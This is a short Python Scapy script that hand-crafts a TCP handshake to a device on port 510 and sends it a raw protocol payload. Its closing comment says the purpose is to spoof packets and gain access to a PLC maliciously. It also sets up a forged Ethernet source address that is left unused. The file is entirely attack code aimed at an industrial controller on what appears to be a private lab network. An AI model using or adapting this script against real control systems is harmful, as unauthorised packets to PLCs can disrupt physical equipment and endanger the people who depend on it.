from scapy.all import *

#sport = random.randint(1024,65535)

# SYN
ip=IP(src='192.168.0.107',dst='192.168.0.104')
SYN=TCP(sport=53934,dport=510,flags='S',seq=100)
SYNACK=sr1(ip/SYN)

# SYN-ACK
data='\x00\x00\x00\x00\x00\x09\x00\x10\x00\x0a\x00\x01\x02\x00\x00'
#data='\x00\x00\x00\x00\x00\x19\x00\x03\x16\x00\xcd\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
my_ack=SYNACK.seq+1
ACK=TCP(sport=53934, dport=510, flags='A', seq=101, ack=my_ack)
send(ip/ACK)
PUSH=TCP(sport=53934, dport=510, flags='PA', seq=101, ack=my_ack)
arp =Ether(src="ab:cd:ef:ab:cd:ef", dst="b8:27:eb:bd:1a:36")
reply=sr1(ip/PUSH/data)
#tcp handshake with 3rd packet sent along with payload
#this is to spoof packets and gain access to the plc maliciously